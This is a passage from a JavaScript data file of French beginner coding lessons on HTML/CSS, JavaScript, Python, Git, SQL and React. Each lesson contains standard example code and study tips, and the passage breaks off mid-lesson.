export const COURSES = [
  {
    id: "html-css",
    category: "Frontend",
    emoji: "🌐",
    title: "HTML & CSS",
    description: "Les fondations du web : structure et style",
    level: "Débutant",
    color: "#E34F26",
    lessons: [
      {
        id: "html-bases",
        title: "Les bases du HTML",
        duration: "10 min",
        content: `# Les bases du HTML

HTML (HyperText Markup Language) est le langage qui structure les pages web. Il utilise des **balises** pour définir le contenu.

## Structure d'une page HTML

\`\`\`html
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ma première page</title>
  </head>
  <body>
    <h1>Bonjour le monde !</h1>
    <p>Ceci est un paragraphe.</p>
  </body>
</html>
\`\`\`

## Les balises essentielles

| Balise | Rôle |
|--------|------|
| \`<h1>\` à \`<h6>\` | Titres (du plus grand au plus petit) |
| \`<p>\` | Paragraphe |
| \`<a href="...">\` | Lien hypertexte |
| \`<img src="...">\` | Image |
| \`<div>\` | Conteneur générique |
| \`<span>\` | Texte inline |
| \`<ul>\` / \`<li>\` | Liste à puces |
| \`<button>\` | Bouton cliquable |

## Exemple complet

\`\`\`html
<body>
  <header>
    <h1>Mon Blog</h1>
    <nav>
      <a href="/accueil">Accueil</a>
      <a href="/articles">Articles</a>
    </nav>
  </header>

  <main>
    <article>
      <h2>Mon premier article</h2>
      <p>Le contenu de l'article ici...</p>
      <img src="photo.jpg" alt="Description de la photo">
    </article>
  </main>

  <footer>
    <p>© 2024 Mon Blog</p>
  </footer>
</body>
\`\`\`

## À retenir
- Chaque balise ouvrante \`<div>\` doit avoir une balise fermante \`</div>\`
- Les attributs comme \`src\`, \`href\`, \`alt\` donnent des infos supplémentaires à la balise
- La balise \`<img>\` n'a pas besoin d'être fermée (balise auto-fermante)`
      },
      {
        id: "css-bases",
        title: "CSS : Mettre en forme",
        duration: "12 min",
        content: `# CSS : Mettre en forme

CSS (Cascading Style Sheets) contrôle l'apparence visuelle de ta page HTML.

## Comment lier le CSS

\`\`\`html
<!-- Dans le <head> de ton HTML -->
<link rel="stylesheet" href="style.css">
\`\`\`

## Syntaxe CSS

\`\`\`css
/* Sélecteur { propriété: valeur; } */
h1 {
  color: #3B82F6;       /* couleur du texte */
  font-size: 32px;      /* taille de police */
  font-weight: bold;    /* gras */
  text-align: center;   /* centré */
}

p {
  color: #666;
  line-height: 1.6;     /* hauteur de ligne */
  margin-bottom: 16px;  /* espace en dessous */
}
\`\`\`

## Sélecteurs CSS

\`\`\`css
/* Balise */
p { color: gray; }

/* Classe (préfixe .) */
.bouton-principal { background: blue; }

/* ID (préfixe #) */
#header { height: 60px; }

/* Combinaison */
.carte p { font-size: 14px; }
\`\`\`

## Le modèle de boîte (Box Model)

Chaque élément HTML est une boîte avec 4 couches :

\`\`\`css
.boite {
  /* Contenu */
  width: 200px;
  height: 100px;

  /* Espace intérieur */
  padding: 16px;

  /* Bordure */
  border: 2px solid #ccc;
  border-radius: 8px;   /* coins arrondis */

  /* Espace extérieur */
  margin: 20px;

  /* Couleur de fond */
  background-color: #f0f0f0;
}
\`\`\`

## Flexbox : mise en page moderne

\`\`\`css
.conteneur {
  display: flex;
  justify-content: space-between; /* répartition horizontale */
  align-items: center;            /* alignement vertical */
  gap: 16px;                      /* espace entre les éléments */
}

/* Exemple : barre de navigation */
.navbar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 0 24px;
  height: 60px;
  background: #1a1a2e;
}
\`\`\`

## À retenir
- \`class\` s'utilise pour plusieurs éléments, \`id\` pour un seul
- Flexbox résout 90% des problèmes de mise en page
- Utilise les DevTools du navigateur (F12) pour inspecter et tester le CSS en live`
      },
      {
        id: "css-responsive",
        title: "Responsive Design",
        duration: "10 min",
        content: `# Responsive Design

Un site **responsive** s'adapte automatiquement à toutes les tailles d'écran (mobile, tablette, desktop).

## Media Queries

\`\`\`css
/* Styles de base (mobile first) */
.container {
  width: 100%;
  padding: 16px;
}

/* Tablette (≥ 768px) */
@media (min-width: 768px) {
  .container {
    max-width: 720px;
    margin: 0 auto;
  }
}

/* Desktop (≥ 1024px) */
@media (min-width: 1024px) {
  .container {
    max-width: 1200px;
  }
}
\`\`\`

## Grille responsive avec CSS Grid

\`\`\`css
.grille-cartes {
  display: grid;
  /* 1 colonne sur mobile, 3 sur desktop */
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 24px;
}
\`\`\`

## Unités relatives

\`\`\`css
.texte {
  font-size: 1rem;      /* relatif à la taille de base (16px) */
  padding: 1.5em;       /* relatif à la taille de police parent */
  width: 90%;           /* 90% de la largeur parent */
  max-width: 600px;     /* jamais plus large que 600px */
  height: 100vh;        /* 100% de la hauteur de l'écran */
}
\`\`\`

## Exemple pratique : Layout complet

\`\`\`css
/* Mobile : tout en colonne */
.layout {
  display: flex;
  flex-direction: column;
}

.sidebar { display: none; }  /* cachée sur mobile */

.content { width: 100%; }

/* Desktop : sidebar + contenu côte à côte */
@media (min-width: 768px) {
  .layout {
    flex-direction: row;
  }

  .sidebar {
    display: block;
    width: 240px;
    flex-shrink: 0;
  }

  .content {
    flex: 1;
  }
}
\`\`\`

## À retenir
- Commence toujours par le mobile (mobile-first)
- \`min-width\` = "à partir de cette taille"
- CSS Grid avec \`auto-fill\` et \`minmax\` est la solution la plus propre pour les grilles`
      }
    ]
  },
  {
    id: "javascript",
    category: "Frontend",
    emoji: "⚡",
    title: "JavaScript",
    description: "Le langage de programmation du web",
    level: "Débutant",
    color: "#F7DF1E",
    lessons: [
      {
        id: "js-bases",
        title: "Variables et types de données",
        duration: "12 min",
        content: `# Variables et types de données

JavaScript est le langage qui rend les pages web interactives.

## Déclarer des variables

\`\`\`javascript
// const : valeur qui ne change pas
const nom = "Alice";
const age = 25;
const pi = 3.14;

// let : valeur qui peut changer
let score = 0;
score = 10;  // OK

// var : ancien style, à éviter
var ancienStyle = "ne plus utiliser";
\`\`\`

## Types de données

\`\`\`javascript
// Nombre (Number)
const entier = 42;
const decimal = 3.14;

// Texte (String)
const prenom = "Marie";
const message = \`Bonjour \${prenom} !\`;  // template literal

// Booléen (Boolean)
const estConnecte = true;
const estAdmin = false;

// Tableau (Array)
const fruits = ["pomme", "banane", "cerise"];
console.log(fruits[0]);  // "pomme"
console.log(fruits.length);  // 3

// Objet (Object)
const utilisateur = {
  nom: "Dupont",
  age: 30,
  email: "dupont@email.com"
};
console.log(utilisateur.nom);  // "Dupont"

// Null / Undefined
const vide = null;        // intentionnellement vide
let nonDefini;            // undefined (pas encore assigné)
\`\`\`

## Opérations courantes

\`\`\`javascript
// Maths
const somme = 5 + 3;       // 8
const produit = 4 * 7;     // 28
const reste = 10 % 3;      // 1 (modulo)

// Texte
const phrase = "Bonjour" + " " + "monde";
const majuscule = "hello".toUpperCase();  // "HELLO"
const longueur = "React".length;          // 5

// Comparaisons (retournent true/false)
5 === 5     // true  (égalité stricte)
5 !== 3     // true  (différent)
10 > 5      // true
3 <= 3      // true
\`\`\`

## À retenir
- Utilise \`const\` par défaut, \`let\` si tu dois réassigner
- \`===\` compare valeur ET type (préférable à \`==\`)
- Les template literals \`\`\` permettent d'insérer des variables dans du texte`
      },
      {
        id: "js-fonctions",
        title: "Fonctions et conditions",
        duration: "12 min",
        content: `# Fonctions et conditions

## Les conditions

\`\`\`javascript
const age = 20;

// if / else if / else
if (age < 13) {
  console.log("Enfant");
} else if (age < 18) {
  console.log("Adolescent");
} else {
  console.log("Adulte");
}

// Opérateur ternaire (forme courte)
const statut = age >= 18 ? "majeur" : "mineur";

// Switch
const jour = "lundi";
switch (jour) {
  case "lundi":
  case "mardi":
    console.log("Début de semaine");
    break;
  case "vendredi":
    console.log("Fin de semaine !");
    break;
  default:
    console.log("Milieu de semaine");
}
\`\`\`

## Les fonctions

\`\`\`javascript
// Déclaration classique
function additionner(a, b) {
  return a + b;
}

// Fonction fléchée (arrow function) - style moderne
const multiplier = (a, b) => a * b;

// Avec des valeurs par défaut
const saluer = (nom = "inconnu") => \`Bonjour \${nom} !\`;

console.log(additionner(3, 4));    // 7
console.log(multiplier(5, 6));     // 30
console.log(saluer("Marie"));      // "Bonjour Marie !"
console.log(saluer());             // "Bonjour inconnu !"
\`\`\`

## Boucles

\`\`\`javascript
// Boucle for classique
for (let i = 0; i < 5; i++) {
  console.log(i);  // 0, 1, 2, 3, 4
}

// Parcourir un tableau
const fruits = ["pomme", "banane", "cerise"];

for (const fruit of fruits) {
  console.log(fruit);
}

// forEach (méthode de tableau)
fruits.forEach(fruit => console.log(fruit));

// while
let compteur = 0;
while (compteur < 3) {
  console.log(compteur);
  compteur++;
}
\`\`\`

## Méthodes de tableau essentielles

\`\`\`javascript
const nombres = [1, 2, 3, 4, 5];

// map : transforme chaque élément
const doubles = nombres.map(n => n * 2);
// [2, 4, 6, 8, 10]

// filter : garde ceux qui passent le test
const pairs = nombres.filter(n => n % 2 === 0);
// [2, 4]

// find : trouve le premier qui correspond
const premier = nombres.find(n => n > 3);
// 4

// reduce : accumule en une valeur
const somme = nombres.reduce((acc, n) => acc + n, 0);
// 15
\`\`\``
      },
      {
        id: "js-dom",
        title: "Manipuler le DOM",
        duration: "15 min",
        content: `# Manipuler le DOM

Le DOM (Document Object Model) est la représentation de ta page HTML en JavaScript. Tu peux modifier la page dynamiquement.

## Sélectionner des éléments

\`\`\`javascript
// Par ID
const titre = document.getElementById("mon-titre");

// Par classe (retourne plusieurs éléments)
const boutons = document.querySelectorAll(".bouton");

// Par sélecteur CSS (retourne le premier)
const nav = document.querySelector("nav");
const premierLien = document.querySelector("nav a");
\`\`\`

## Modifier le contenu

\`\`\`javascript
const titre = document.querySelector("h1");

// Changer le texte
titre.textContent = "Nouveau titre";

// Changer le HTML (attention aux injections !)
titre.innerHTML = "<span>Titre <em>stylé</em></span>";

// Changer les styles
titre.style.color = "blue";
titre.style.fontSize = "24px";

// Ajouter/supprimer des classes
titre.classList.add("actif");
titre.classList.remove("inactif");
titre.classList.toggle("sombre");  // ajoute si absent, supprime si présent
\`\`\`

## Écouter les événements

\`\`\`javascript
const bouton = document.querySelector("#mon-bouton");

bouton.addEventListener("click", () => {
  alert("Bouton cliqué !");
});

// Formulaire
const formulaire = document.querySelector("form");
formulaire.addEventListener("submit", (event) => {
  event.preventDefault();  // empêche le rechargement de la page
  const email = document.querySelector("#email").value;
  console.log("Email soumis :", email);
});

// Saisie en temps réel
const input = document.querySelector("#recherche");
input.addEventListener("input", (event) => {
  console.log("Saisie :", event.target.value);
});
\`\`\`

## Créer et insérer des éléments

\`\`\`javascript
// Créer un élément
const nouvelleCard = document.createElement("div");
nouvelleCard.className = "card";
nouvelleCard.innerHTML = \`
  <h3>Titre de la card</h3>
  <p>Description de la card</p>
\`;

// L'ajouter dans la page
const conteneur = document.querySelector("#liste");
conteneur.appendChild(nouvelleCard);

// Supprimer un élément
const aSupprimer = document.querySelector(".obsolete");
aSupprimer.remove();
\`\`\`

## Exemple pratique : Liste dynamique

\`\`\`javascript
const items = ["Apprendre JS", "Faire un projet", "Trouver un job"];
const liste = document.querySelector("#liste");

items.forEach(item => {
  const li = document.createElement("li");
  li.textContent = item;

  const suppr = document.createElement("button");
  suppr.textContent = "✕";
  suppr.addEventListener("click", () => li.remove());

  li.appendChild(suppr);
  liste.appendChild(li);
});
\`\`\``
      },
      {
        id: "js-async",
        title: "Async/Await et APIs",
        duration: "15 min",
        content: `# Async/Await et APIs

Beaucoup d'opérations en JS prennent du temps (chargement de données, requêtes réseau). On utilise **async/await** pour les gérer proprement.

## Comprendre l'asynchrone

\`\`\`javascript
// Problème : fetch() ne retourne pas directement les données
// Il retourne une "Promesse" qui sera résolue plus tard

// ❌ Ce code ne fonctionne pas
const données = fetch("https://api.example.com/users");
console.log(données);  // Promise { <pending> }

// ✅ Avec async/await
async function chargerUtilisateurs() {
  const réponse = await fetch("https://api.example.com/users");
  const données = await réponse.json();
  console.log(données);
}
\`\`\`

## Fetch avec async/await

\`\`\`javascript
async function obtenirUtilisateur(id) {
  try {
    const réponse = await fetch(\`https://jsonplaceholder.typicode.com/users/\${id}\`);

    if (!réponse.ok) {
      throw new Error(\`Erreur HTTP : \${réponse.status}\`);
    }

    const utilisateur = await réponse.json();
    return utilisateur;
  } catch (erreur) {
    console.error("Erreur :", erreur.message);
    return null;
  }
}

// Utilisation
const user = await obtenirUtilisateur(1);
console.log(user.name);  // "Leanne Graham"
\`\`\`

## Envoyer des données (POST)

\`\`\`javascript
async function créerArticle(titre, contenu) {
  const réponse = await fetch("https://api.example.com/articles", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": \`Bearer \${localStorage.getItem("token")}\`
    },
    body: JSON.stringify({ titre, contenu })
  });

  const article = await réponse.json();
  return article;
}
\`\`\`

## Exemple complet : Afficher des données

\`\`\`javascript
async function afficherPosts() {
  const liste = document.querySelector("#posts");
  liste.innerHTML = "<p>Chargement...</p>";

  try {
    const réponse = await fetch("https://jsonplaceholder.typicode.com/posts?_limit=5");
    const posts = await réponse.json();

    liste.innerHTML = posts.map(post => \`
      <div class="post">
        <h3>\${post.title}</h3>
        <p>\${post.body}</p>
      </div>
    \`).join("");

  } catch (erreur) {
    liste.innerHTML = \`<p>Erreur : \${erreur.message}</p>\`;
  }
}

afficherPosts();
\`\`\`

## À retenir
- \`async\` devant une fonction = elle peut utiliser \`await\`
- \`await\` attend qu'une Promesse soit résolue
- Toujours entourer de \`try/catch\` pour gérer les erreurs
- \`réponse.json()\` convertit la réponse JSON en objet JS`
      }
    ]
  },
  {
    id: "python",
    category: "Backend",
    emoji: "🐍",
    title: "Python",
    description: "Programmation polyvalente et lisible",
    level: "Débutant",
    color: "#3776AB",
    lessons: [
      {
        id: "python-bases",
        title: "Bases de Python",
        duration: "12 min",
        content: `# Bases de Python

Python est un langage simple à lire et puissant. Pas besoin de \`;\` ni d'accolades \`{}\`.

## Variables et types

\`\`\`python
# Pas besoin de déclarer le type
nom = "Alice"
age = 25
taille = 1.75
est_etudiant = True

# Afficher
print("Bonjour", nom)
print(f"J'ai {age} ans")  # f-string (recommandé)

# Types
type(nom)        # <class 'str'>
type(age)        # <class 'int'>
type(taille)     # <class 'float'>
type(True)       # <class 'bool'>
\`\`\`

## Listes et dictionnaires

\`\`\`python
# Liste (comme les tableaux JS)
fruits = ["pomme", "banane", "cerise"]
fruits.append("mangue")      # ajouter à la fin
fruits.remove("banane")      # supprimer
print(fruits[0])             # "pomme"
print(len(fruits))           # 3

# Dictionnaire (comme les objets JS)
utilisateur = {
    "nom": "Dupont",
    "age": 30,
    "email": "dupont@email.com"
}
print(utilisateur["nom"])    # "Dupont"
utilisateur["ville"] = "Paris"  # ajouter une clé

# Vérifier si une clé existe
if "email" in utilisateur:
    print(utilisateur["email"])
\`\`\`

## Conditions et boucles

\`\`\`python
# Conditions (l'indentation est OBLIGATOIRE)
age = 20

if age < 13:
    print("Enfant")
elif age < 18:
    print("Adolescent")
else:
    print("Adulte")

# Boucle for
for fruit in fruits:
    print(fruit)

# Boucle with range
for i in range(5):   # 0, 1, 2, 3, 4
    print(i)

# Boucle while
compteur = 0
while compteur < 3:
    print(compteur)
    compteur += 1
\`\`\`

## Fonctions

\`\`\`python
def additionner(a, b):
    return a + b

def saluer(nom="inconnu"):  # valeur par défaut
    return f"Bonjour {nom} !"

print(additionner(3, 4))  # 7
print(saluer("Marie"))    # "Bonjour Marie !"
print(saluer())           # "Bonjour inconnu !"
\`\`\``
      },
      {
        id: "python-poo",
        title: "Programmation Orientée Objet",
        duration: "15 min",
        content: `# Programmation Orientée Objet (POO)

La POO organise le code en **classes** qui regroupent données et comportements.

## Créer une classe

\`\`\`python
class Animal:
    # __init__ est le constructeur (appelé à la création)
    def __init__(self, nom, espece):
        self.nom = nom          # attribut d'instance
        self.espece = espece
        self.energie = 100

    # Méthode (fonction de la classe)
    def manger(self, nourriture):
        self.energie += 20
        print(f"{self.nom} mange {nourriture}. Énergie : {self.energie}")

    def présenter(self):
        return f"Je suis {self.nom}, un(e) {self.espece}"

    # Représentation textuelle
    def __str__(self):
        return f"Animal({self.nom}, {self.espece})"


# Créer des instances (objets)
chat = Animal("Minou", "chat")
chien = Animal("Rex", "chien")

chat.manger("croquettes")     # "Minou mange croquettes. Énergie : 120"
print(chien.présenter())      # "Je suis Rex, un(e) chien"
print(chat)                   # "Animal(Minou, chat)"
\`\`\`

## Héritage

\`\`\`python
class Chien(Animal):  # Chien hérite de Animal
    def __init__(self, nom, race):
        super().__init__(nom, "chien")  # appelle Animal.__init__
        self.race = race

    def aboyer(self):
        print(f"{self.nom} : Woof !")

    # Surcharger une méthode parent
    def présenter(self):
        return f"Je suis {self.nom}, un {self.race}"


rex = Chien("Rex", "Labrador")
rex.aboyer()              # "Rex : Woof !"
rex.manger("viande")      # hérité de Animal
print(rex.présenter())    # "Je suis Rex, un Labrador"

# Vérifier le type
print(isinstance(rex, Chien))   # True
print(isinstance(rex, Animal))  # True (héritage)
\`\`\`

## Exemple pratique : Gestion de comptes bancaires

\`\`\`python
class CompteBancaire:
    def __init__(self, titulaire, solde_initial=0):
        self.titulaire = titulaire
        self._solde = solde_initial  # _ = convention "privé"
        self.historique = []

    @property
    def solde(self):  # getter
        return self._solde

    def déposer(self, montant):
        if montant <= 0:
            raise ValueError("Le montant doit être positif")
        self._solde += montant
        self.historique.append(f"+{montant}€")

    def retirer(self, montant):
        if montant > self._solde:
            raise ValueError("Solde insuffisant")
        self._solde -= montant
        self.historique.append(f"-{montant}€")

    def __str__(self):
        return f"Compte de {self.titulaire} : {self._solde}€"


compte = CompteBancaire("Alice", 1000)
compte.déposer(500)
compte.retirer(200)
print(compte)              # "Compte de Alice : 1300€"
print(compte.historique)   # ['+500€', '-200€']
\`\`\``
      },
      {
        id: "python-fichiers-apis",
        title: "Fichiers et requêtes HTTP",
        duration: "12 min",
        content: `# Fichiers et requêtes HTTP

## Lire et écrire des fichiers

\`\`\`python
# Écrire dans un fichier
with open("notes.txt", "w", encoding="utf-8") as f:
    f.write("Première ligne\\n")
    f.write("Deuxième ligne\\n")

# Lire un fichier entier
with open("notes.txt", "r", encoding="utf-8") as f:
    contenu = f.read()
    print(contenu)

# Lire ligne par ligne
with open("notes.txt", "r") as f:
    for ligne in f:
        print(ligne.strip())  # .strip() enlève \\n

# Ajouter à la fin (mode "a" pour append)
with open("notes.txt", "a") as f:
    f.write("Troisième ligne\\n")
\`\`\`

## JSON : sauvegarder des données structurées

\`\`\`python
import json

# Écrire du JSON
utilisateurs = [
    {"nom": "Alice", "age": 25},
    {"nom": "Bob", "age": 30}
]

with open("utilisateurs.json", "w") as f:
    json.dump(utilisateurs, f, indent=2, ensure_ascii=False)

# Lire du JSON
with open("utilisateurs.json", "r") as f:
    données = json.load(f)

for user in données:
    print(user["nom"])
\`\`\`

## Requêtes HTTP avec requests

\`\`\`python
# pip install requests
import requests

# GET : récupérer des données
réponse = requests.get("https://jsonplaceholder.typicode.com/posts/1")

if réponse.status_code == 200:
    post = réponse.json()
    print(post["title"])
else:
    print(f"Erreur {réponse.status_code}")

# GET avec paramètres
params = {"_limit": 5, "userId": 1}
réponse = requests.get(
    "https://jsonplaceholder.typicode.com/posts",
    params=params
)
posts = réponse.json()

# POST : envoyer des données
nouveau_post = {
    "title": "Mon article",
    "body": "Contenu de l'article",
    "userId": 1
}
réponse = requests.post(
    "https://jsonplaceholder.typicode.com/posts",
    json=nouveau_post
)
print(réponse.status_code)   # 201
print(réponse.json())        # {"id": 101, ...}
\`\`\`

## Gestion des erreurs

\`\`\`python
import requests
from requests.exceptions import RequestException

def appeler_api(url):
    try:
        réponse = requests.get(url, timeout=10)
        réponse.raise_for_status()  # lève une exception si 4xx/5xx
        return réponse.json()
    except requests.exceptions.Timeout:
        print("La requête a pris trop de temps")
    except requests.exceptions.HTTPError as e:
        print(f"Erreur HTTP : {e}")
    except RequestException as e:
        print(f"Erreur réseau : {e}")
    return None
\`\`\``
      }
    ]
  },
  {
    id: "git",
    category: "Fondamentaux",
    emoji: "🔧",
    title: "Git & GitHub",
    description: "Versionner et collaborer sur son code",
    level: "Débutant",
    color: "#F05032",
    lessons: [
      {
        id: "git-bases",
        title: "Les commandes essentielles",
        duration: "12 min",
        content: `# Git : Versionner son code

Git est un outil qui sauvegarde l'historique de toutes les modifications de ton code.

## Initialiser un projet

\`\`\`bash
# Créer un nouveau dépôt Git
git init

# Cloner un dépôt existant depuis GitHub
git clone https://github.com/utilisateur/projet.git
\`\`\`

## Le cycle de base

\`\`\`bash
# 1. Voir l'état des fichiers
git status

# 2. Ajouter des fichiers à la "zone de staging"
git add mon-fichier.js          # un fichier spécifique
git add src/                    # tout un dossier
git add .                       # TOUS les fichiers modifiés

# 3. Créer un commit (une sauvegarde)
git commit -m "Ajouter la page de connexion"

# 4. Envoyer sur GitHub
git push origin main
\`\`\`

## Consulter l'historique

\`\`\`bash
# Voir tous les commits
git log

# Version compacte
git log --oneline

# Voir les modifications d'un fichier
git diff mon-fichier.js

# Voir les modifications entre commits
git diff abc123 def456
\`\`\`

## Revenir en arrière

\`\`\`bash
# Annuler les modifications non sauvegardées
git restore mon-fichier.js

# Revenir au dernier commit (ATTENTION : perte de données)
git reset --hard HEAD

# Créer un commit qui annule un commit précédent (plus sûr)
git revert abc123
\`\`\`

## Configuration initiale (à faire une seule fois)

\`\`\`bash
git config --global user.name "Ton Nom"
git config --global user.email "ton@email.com"
git config --global core.editor "code --wait"  # VS Code comme éditeur
\`\`\`

## Bonnes pratiques de commit

\`\`\`bash
# ✅ Messages clairs et en action
git commit -m "Ajouter authentification JWT"
git commit -m "Corriger bug affichage mobile"
git commit -m "Refactoriser composant Header"

# ❌ Messages vagues
git commit -m "fix"
git commit -m "maj"
git commit -m "wip"
\`\`\``
      },
      {
        id: "git-branches",
        title: "Branches et collaboration",
        duration: "12 min",
        content: `# Branches et collaboration

Les branches permettent de travailler sur des fonctionnalités sans affecter le code principal.

## Gérer les branches

\`\`\`bash
# Voir toutes les branches
git branch

# Créer une nouvelle branche
git branch feature/authentification

# Se déplacer sur une branche
git checkout feature/authentification

# Créer ET se déplacer (raccourci)
git checkout -b feature/profil-utilisateur

# Supprimer une branche (après fusion)
git branch -d feature/authentification
\`\`\`

## Workflow typique

\`\`\`bash
# 1. Partir de main à jour
git checkout main
git pull origin main

# 2. Créer une branche pour ta fonctionnalité
git checkout -b feature/panier-achat

# 3. Coder, tester, commiter
git add .
git commit -m "Ajouter composant panier"
git commit -m "Connecter panier à l'API"

# 4. Pousser ta branche
git push origin feature/panier-achat

# 5. Créer une Pull Request sur GitHub
# → Va sur GitHub, clique "Compare & pull request"

# 6. Après validation, fusionner dans main
git checkout main
git merge feature/panier-achat
git push origin main
\`\`\`

## Résoudre les conflits

\`\`\`bash
# Récupérer les modifications des collègues
git pull origin main

# Si conflit, Git marque les fichiers :
# <<<<<<< HEAD
# ton code
# =======
# code du collègue
# >>>>>>> origin/main

# 1. Ouvrir le fichier, choisir quelle version garder
# 2. Supprimer les marqueurs <<< === >>>
# 3. Sauvegarder

git add fichier-en-conflit.js
git commit -m "Résoudre conflit dans fichier-en-conflit.js"
\`\`\`

## Commandes utiles

\`\`\`bash
# Sauvegarder temporairement (sans commiter)
git stash
git stash pop  # récupérer

# Voir les branches distantes
git branch -r

# Synchroniser avec GitHub
git fetch origin

# Résumé graphique des branches
git log --oneline --graph --all
\`\`\``
      }
    ]
  },
  {
    id: "sql",
    category: "Base de données",
    emoji: "🗄️",
    title: "SQL & Bases de données",
    description: "Stocker et interroger des données",
    level: "Débutant",
    color: "#336791",
    lessons: [
      {
        id: "sql-bases",
        title: "Les requêtes fondamentales",
        duration: "15 min",
        content: `# SQL : Interroger une base de données

SQL (Structured Query Language) sert à lire, créer, modifier et supprimer des données.

## Créer une table

\`\`\`sql
CREATE TABLE utilisateurs (
    id       INTEGER PRIMARY KEY AUTOINCREMENT,
    nom      VARCHAR(100) NOT NULL,
    email    VARCHAR(255) UNIQUE NOT NULL,
    age      INTEGER,
    créé_le  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE articles (
    id           INTEGER PRIMARY KEY AUTOINCREMENT,
    titre        VARCHAR(200) NOT NULL,
    contenu      TEXT,
    auteur_id    INTEGER REFERENCES utilisateurs(id),
    publié       BOOLEAN DEFAULT FALSE
);
\`\`\`

## Insérer des données (INSERT)

\`\`\`sql
-- Insérer un enregistrement
INSERT INTO utilisateurs (nom, email, age)
VALUES ('Alice Dupont', 'alice@email.com', 28);

-- Insérer plusieurs enregistrements
INSERT INTO utilisateurs (nom, email, age) VALUES
    ('Bob Martin', 'bob@email.com', 35),
    ('Claire Petit', 'claire@email.com', 22);
\`\`\`

## Lire des données (SELECT)

\`\`\`sql
-- Tout lire
SELECT * FROM utilisateurs;

-- Colonnes spécifiques
SELECT nom, email FROM utilisateurs;

-- Avec filtre
SELECT * FROM utilisateurs WHERE age > 25;

-- Plusieurs conditions
SELECT * FROM utilisateurs
WHERE age > 25 AND email LIKE '%@gmail.com';

-- Trier
SELECT * FROM utilisateurs ORDER BY age DESC;

-- Limiter
SELECT * FROM utilisateurs LIMIT 10 OFFSET 20;  -- page 3

-- Compter
SELECT COUNT(*) FROM utilisateurs;
SELECT AVG(age) FROM utilisateurs;
SELECT MAX(age), MIN(age) FROM utilisateurs;
\`\`\`

## Modifier et supprimer

\`\`\`sql
-- Modifier
UPDATE utilisateurs
SET age = 29, nom = 'Alice Martin'
WHERE id = 1;

-- Supprimer
DELETE FROM utilisateurs WHERE id = 5;

-- ATTENTION : sans WHERE, tout est supprimé !
-- DELETE FROM utilisateurs;  ← supprime TOUT
\`\`\``
      },
      {
        id: "sql-jointures",
        title: "Jointures et relations",
        duration: "15 min",
        content: `# Jointures et relations

Les jointures permettent de combiner des données de plusieurs tables.

## Les types de jointures

\`\`\`sql
-- INNER JOIN : seulement les correspondances des deux côtés
SELECT articles.titre, utilisateurs.nom AS auteur
FROM articles
INNER JOIN utilisateurs ON articles.auteur_id = utilisateurs.id;

-- LEFT JOIN : tous les articles, même sans auteur correspondant
SELECT articles.titre, utilisateurs.nom AS auteur
FROM articles
LEFT JOIN utilisateurs ON articles.auteur_id = utilisateurs.id;

-- Avec alias pour simplifier
SELECT a.titre, u.nom AS auteur, u.email
FROM articles a
JOIN utilisateurs u ON a.auteur_id = u.id
WHERE a.publié = TRUE
ORDER BY a.titre;
\`\`\`

## GROUP BY : regrouper les résultats

\`\`\`sql
-- Nombre d'articles par auteur
SELECT u.nom, COUNT(a.id) AS nb_articles
FROM utilisateurs u
LEFT JOIN articles a ON a.auteur_id = u.id
GROUP BY u.id, u.nom
ORDER BY nb_articles DESC;

-- Filtrer les groupes (HAVING au lieu de WHERE)
SELECT u.nom, COUNT(a.id) AS nb_articles
FROM utilisateurs u
JOIN articles a ON a.auteur_id = u.id
GROUP BY u.id
HAVING COUNT(a.id) > 5;  -- seulement les auteurs avec plus de 5 articles
\`\`\`

## Requêtes imbriquées (sous-requêtes)

\`\`\`sql
-- Utilisateurs qui ont au moins un article
SELECT nom FROM utilisateurs
WHERE id IN (SELECT DISTINCT auteur_id FROM articles);

-- Article le plus récent par auteur
SELECT u.nom, a.titre, a.créé_le
FROM articles a
JOIN utilisateurs u ON a.auteur_id = u.id
WHERE a.créé_le = (
    SELECT MAX(créé_le) FROM articles
    WHERE auteur_id = a.auteur_id
);
\`\`\`

## Index : accélérer les requêtes

\`\`\`sql
-- Créer un index sur une colonne souvent filtrée
CREATE INDEX idx_articles_auteur ON articles(auteur_id);
CREATE INDEX idx_utilisateurs_email ON utilisateurs(email);

-- Les clés primaires et UNIQUE ont déjà des index automatiques
\`\`\`

## Bonnes pratiques

\`\`\`sql
-- ✅ Nommer les colonnes explicitement
SELECT u.nom, a.titre FROM utilisateurs u JOIN articles a ON ...;

-- ❌ Éviter SELECT * en production (lent, fragile)
SELECT * FROM articles JOIN utilisateurs ON ...;

-- ✅ Utiliser des transactions pour les opérations critiques
BEGIN;
UPDATE comptes SET solde = solde - 100 WHERE id = 1;
UPDATE comptes SET solde = solde + 100 WHERE id = 2;
COMMIT;  -- ou ROLLBACK si erreur
\`\`\``
      }
    ]
  },
  {
    id: "react",
    category: "Frontend",
    emoji: "⚛️",
    title: "React",
    description: "Construire des interfaces modernes",
    level: "Intermédiaire",
    color: "#61DAFB",
    lessons: [
      {
        id: "react-composants",
        title: "Composants et props",
        duration: "15 min",
        content: `# Composants et props

React découpe l'interface en **composants** réutilisables.

## Créer un composant

\`\`\`jsx
// Composant simple (fonction)
function Bouton() {
  return (
    <button style={{ background: 'blue', color: 'white', padding: '8px 16px' }}>
      Cliquez-moi
    </button>
  );
}

// Composant avec JSX complexe
function CarteUtilisateur() {
  return (
    <div className="card">
      <img src="avatar.jpg" alt="Avatar" />
      <h2>Alice Dupont</h2>
      <p>Développeuse Full-Stack</p>
    </div>
  );
}
\`\`\`

## Les props : passer des données

\`\`\`jsx
// Composant qui accepte des props
function Bouton({ texte, couleur, onClick }) {
  return (
    <button
      onClick={onClick}
      style={{ background: couleur, color: 'white', padding: '8px 16px' }}
    >
      {texte}
    </button>
  );
}

// Utilisation avec des valeurs différentes
function App() {
  return (
    <div>
      <Bouton texte="Valider" couleur="green" onClick={() => alert("Validé!")} />
      <Bouton texte="Annuler" couleur="red" onClick={() => alert("Annulé!")} />
    </div>
  );
}
\`\`\`

## Afficher des listes

\`\`\`jsx
function ListeUtilisateurs({ utilisateurs }) {
  return (
    <ul>
      {utilisateurs.map(user => (
        // key obligatoire pour les listes !
        <li key={user.id}>
          {user.avatar} {user.nom} — {user.email}
        </li>
      ))}
    </ul>
  );
}

// Utilisation
const users = [
